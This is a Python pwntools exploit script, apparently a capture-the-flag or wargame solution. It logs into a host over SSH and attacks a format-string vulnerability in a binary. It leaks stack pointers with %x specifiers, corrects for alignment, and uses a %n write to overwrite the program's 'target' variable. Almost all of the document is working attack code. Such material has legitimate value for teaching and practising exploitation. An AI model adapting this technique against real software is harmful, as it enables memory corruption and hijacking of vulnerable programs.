from pwn import *
import os.path as op

s = ssh(host=args.HOST, user=args.USER, password=args.PASS, port=int(args.PORT))

lbin = op.join('/tmp', op.basename(args.BIN))
s.download_file(args.BIN, lbin)
e = ELF(lbin)
target_addr = e.symbols['target']
log.info('target_addr: %08x', target_addr)

'''
      .
      .
  4   | bp_vuln
      +================ (printf)
  4   | vuln+X (call)
      +---------------- <-- sp_vuln ("$0")
      | fmt ptr         // can't be leaked (too close: "$0" not valid)
 0x18 |----------------
      |     ...
      +---------------- <-- bp_vuln
  4   | bp_main
      +================ (vuln)
  4   | main+X (call)
      +---------------- <-- sp_main
      | fmt ptr         // leakable!  o----.
 0x10 |----------------                    |
      |     ...                            |
      +----------------                    |
  ?   | align & ~0xf                       |
      +---------------- <- bp_main         |
  4   | bp_start                           |
      +================ (main)             |
  4   | start+X (call)                     |
      +----------------                    |
  ?   |     ...                            |
      +---------------- <------------------' (misalign possible)
  ?   | "<fmt> ... '\0'
      +----------------
  ?   |     ...
      `---------------- 0xbfffffff (stack)

'''


# Always use the same arg length to keep a consistent stack pointer between runs
def get_fixed_len_fmt(fmt):
    PAD = 15  # arbitrary, long to always fit everything
    return fit({0: fmt + '.', PAD: '\n'})


# off is relative to sp_vuln
def leak_ptr_at(off):
    idx = off >> 2
    assert idx * 4 == off
    fmt = get_fixed_len_fmt('%' + str(idx) + '$08x')
    with s.system([args.BIN, fmt]) as p:
        return int(p.recv()[:8], 16)


# Leak the first accessible hint about the stack address
bp_main = leak_ptr_at(0x18)
log.info('bp_main: %08x', bp_main)

# Stack pointer reference to use to derivate format printf argument indices
sp_vuln = (bp_main & ~0xf) - 0x10 - 4 - 4 - 0x18
log.info('sp_vuln: %08x', sp_vuln)

# Identify fmt address pushed by vuln's parent
sp_main = sp_vuln + 0x18 + 4 + 4
sp_main_off = sp_main - sp_vuln
argv1 = leak_ptr_at(sp_main_off)
argv1_off = argv1 - sp_vuln
log.info('argv1: %08x (+%d)', argv1, argv1_off)

# We might miss the start of the string due to a 32-bit misalign (arg indices
# assume 32-bit steps), so we need to offset our target address and adjust the
# index
argv1_idx = argv1_off >> 2
missby = argv1_off - argv1_idx * 4
padding = 4 - missby
n_idx = argv1_idx + 1
log.info('missby:  %dB', missby)
log.info('padding: %dB', padding)
log.info('n_idx: %d', n_idx)

payload = cyclic(padding) + p32(target_addr) + '%' + str(n_idx) + '$n'
fmt = get_fixed_len_fmt(payload)
with s.system([args.BIN, fmt]) as p:
    p.recvline()
    ret = p.recvline()
    assert ret == 'you have modified the target :)\n'
